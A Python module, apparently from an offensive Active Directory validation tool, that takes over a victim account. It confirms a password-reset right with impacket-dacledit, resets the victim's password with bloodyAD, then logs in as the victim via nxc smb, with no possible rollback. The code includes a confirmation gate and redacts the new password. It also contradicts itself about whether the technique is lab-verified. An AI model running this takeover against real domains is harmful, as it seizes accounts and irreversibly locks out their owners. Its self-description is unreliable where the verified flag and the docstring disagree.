"""FORCE-CHANGE-PASSWORD validation executor -- T3 (ACL / object-takeover edges).

The destructive reference case: a trustee already holding the
User-Force-Change-Password extended right (or GenericAll) resets a victim's
password and re-authenticates as them:

    impacket-dacledit -action read   (confirm the PRECONDITION right)
    ctx.destructive_confirmer.confirm("force_change_password", ...)  (warn-press-yes)
    bloodyAD ... set password '<victim>' '<newpw>'
    nxc smb <dc> -u <victim> -p <newpw>   (= the terminal proof)
    ROLLBACK: deliberately NONE (AD never exposes the prior password hash to an
              attribute-write caller -- there is nothing to restore)

Mutating AND **destructive** (irreversible, by design -- `destructive = True`):
the per-call runtime gate (``ctx.destructive_confirmer``) is checked BEFORE any
write, and the engine-level static filter (`chain_engine.py`'s `_edge_allowed`)
excludes this executor from any automated, composed search unless
`allow_destructive=True`.

The generated password is a SECRET: `secrets.token_urlsafe(18)`, never stored,
never logged, never placed in the receipt (mirrors `rbcd.py`'s own-generated
computer password and `roast.py`'s cracked plaintext).

``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``).
"""
from __future__ import annotations

import re
import secrets
from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .. import states
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .acl_common import dacledit_read_argv, confirm_ace, _RE_ACE_GENERIC_ALL, _RE_FORCE_CHANGE_PW_RIGHT


# bloodyAD set-password success marker. UNVERIFIED -- pin in-lab (same status
# as rbcd.py's _RE_BLOODYAD_RBCD_OK).
_RE_BLOODYAD_SET_PW_OK = re.compile(
    r"(successfully set|password (has been )?changed|updated)", re.I)

# nxc re-auth success markers (same literals as roast.py/rbcd.py -- modest
# duplication, zero cross-module coupling, same rationale throughout T3).
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)


def _tool_errored(res: RunResult) -> bool:
    return bool(res.error) or res.timed_out or res.returncode is None


def _bloodyad_auth_argv(cfg, dc: str) -> list[str]:
    argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    argv += ["--host", dc]
    return argv


class ForceChangePasswordExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "FORCE-CHANGE-PASSWORD"
    technique_class = "acl"
    terminal_kind = "authn_success"
    mutating = True
    destructive = True
    verified_recipe = True         # lab-proven on GOAD 26NOV2026 (hodor, authn_success); the harness
                                   # certifies it via the reviewed irreversible-technique carve-out
                                   # (rollback is impossible by design; the receipt acknowledges it)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CRED})
    recipe_ref = ("T3 FORCE-CHANGE-PASSWORD = dacledit read (confirm precondition "
                  "User-Force-Change-Password/GenericAll) ; DESTRUCTIVE-CONFIRM gate "
                  "; bloodyAD set password ; nxc smb reauth (= the terminal) ; "
                  "ROLLBACK: deliberately NONE, by design (recipe-known, NOT "
                  "lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        victim = (finding.entity or {}).get("principal") or ""
        return [
            ParamSpec(
                name="victim", kind="free",
                description="The account whose password is reset. Requires an "
                            "already-held User-Force-Change-Password right (or "
                            "GenericAll) over it. IRREVERSIBLE -- the original "
                            "password cannot be recovered or restored.",
                recommended=victim,
                rationale="The principal of the aranum ACL finding.",
                required=True,
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        victim = params["victim"].value or (finding.entity or {}).get("principal") or ""
        return {"domain": ctx.config.domain, "principal": victim}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-dacledit -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
            "(confirm precondition User-Force-Change-Password/GenericAll)",
            "*** DESTRUCTIVE: warn-press-yes confirmation required ***",
            f"bloodyAD ... --host {dc} set password '{v['victim']}' ***",
            f"nxc smb {dc} -u {v['victim']} -p ***   (= authn proof)",
            "ROLLBACK: NONE -- the original password cannot be recovered (irreversible)",
        ]

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        victim = v["victim"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) confirm the PRECONDITION right over the victim --------------------
        read_argv = dacledit_read_argv(cfg, victim, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_FORCE_CHANGE_PW_RIGHT))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("force_change_password_not_confirmed")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:force_change_password_unconfirmed_attempting_anyway")

        # 2) DESTRUCTIVE-CONFIRM gate -- before any write, always attempted
        #    first (interactive press-yes, or the fail-closed non-interactive
        #    explicit-flag path -- see base.py's DestructiveConfirmationProvider) --
        detail = {"victim": victim, "domain": cfg.domain}
        approved = ctx.destructive_confirmer.confirm("force_change_password", detail)
        if not approved:
            gate["classifier"] = "denied"
            gate["op"] = "force_change_password"
            errors.append("gate_denied:force_change_password")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        gate["classifier"] = "approved"
        gate["op"] = "force_change_password"

        # 3) reset the password (mutating, IRREVERSIBLE) -- once this call is
        #    issued there is no going back, so the rollback advisory is
        #    recorded unconditionally from this point on, success or not -----
        new_pw = secrets.token_urlsafe(18)                 # secret, never stored
        mutation["applied"] = True
        errors.append(f"advisory:irreversible:original_password_not_recoverable:"
                      f"{victim}@{cfg.domain}")
        set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "password", victim, new_pw]
        res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        set_out = (res.stdout or "") + (res.stderr or "")
        set_ok = bool(_RE_BLOODYAD_SET_PW_OK.search(set_out))
        if set_ok:
            artifact["_reveal"].append(SecretReveal(self.technique, "password", victim, new_pw))
        # bloodyAD's `set password` takes the new password as a bare POSITIONAL
        # argument (no preceding flag), so `redact_argv`'s flag-keyed masking
        # (-p/--password/...) cannot catch it -- manually blank it before
        # handing the display argv to `record()` (which still redacts the
        # operator's own `-p <password>` in the auth prefix via the normal path).
        record("set_password", set_argv[:-1] + ["***"], res, set_ok,
              note="password reset" if set_ok else "password reset failed")
        if not set_ok:
            errors.append("password_set_failed")
            return finish_artifact(steps, gate, mutation, None, False, errors)

        # 4) re-authenticate as the victim = the terminal proof (never the set
        #    call's own exit code alone) -----------------------------------------
        nxc_argv = ["nxc", "smb", dc, "-u", victim, "-p", new_pw]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        reauth_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("reauth", nxc_argv, res, reauth_ok,
              note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if reauth_ok else "")
        if not reauth_ok:
            errors.append("reauth_failed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=reauth_ok, impersonated=victim,
            predicate=(f"force-reset {victim}'s password via a confirmed "
                      "User-Force-Change-Password/GenericAll right and "
                      "re-authenticated as them"),
            proof_token=proof.proof_token("FORCE-CHANGE-PASSWORD", cfg.domain, victim,
                                          "authn_success" if reauth_ok else "authn_failed"),
            extra={"victim": victim},
        )
        # Complete tracks the terminal proof ALONE -- rollback is deliberately
        # NEVER performed for this technique (by design, not a gap), so it must
        # never be required for `complete`, unlike every other T3 executor.
        complete = bool(reauth_ok)
        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
